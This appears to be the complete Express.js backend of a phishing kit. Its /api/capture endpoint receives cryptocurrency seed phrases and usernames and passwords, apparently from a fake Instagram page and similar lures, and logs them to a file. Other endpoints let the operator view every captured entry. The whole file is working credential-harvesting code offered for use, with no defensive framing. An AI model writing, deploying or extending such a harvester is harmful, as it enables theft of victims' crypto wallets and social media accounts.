const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Serve static files from current directory
app.use(express.static(path.join(__dirname)));

// Capture endpoint
app.post('/api/capture', (req, res) => {
    const data = req.body;
    let entry;

    // Handle both formats:
    // 1. { phrase: "seed words..." }
    // 2. { phrase: JSON.stringify({username, password, ...}) }
    if (data.phrase) {
        // Try to parse if it's stringified JSON
        try {
            const parsed = JSON.parse(data.phrase);
            entry = { ...parsed, timestamp: new Date().toISOString() };
        } catch {
            entry = { phrase: data.phrase, timestamp: new Date().toISOString() };
        }
    } else {
        entry = { ...data, timestamp: new Date().toISOString() };
    }

    const logLine = JSON.stringify(entry) + '\n';
    fs.appendFileSync('captured_phrases.log', logLine);

    // Also keep latest in memory
    global.latestCapture = entry;

    res.json({ status: 'ok' });
});

app.get('/api/capture', (req, res) => {
    res.json(global.latestCapture || { phrase: 'No captures yet' });
});

app.get('/api/log', (req, res) => {
    try {
        const data = fs.readFileSync('captured_phrases.log', 'utf8');
        const entries = data.trim().split('\n').filter(l => l).map(l => JSON.parse(l));
        res.json({ entries });
    } catch {
        res.json({ entries: [] });
    }
});

app.get('/view', (req, res) => {
    res.sendFile(path.join(__dirname, 'view.html'));
});

app.get('/instagram', (req, res) => {
    res.sendFile(path.join(__dirname, 'instagram.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});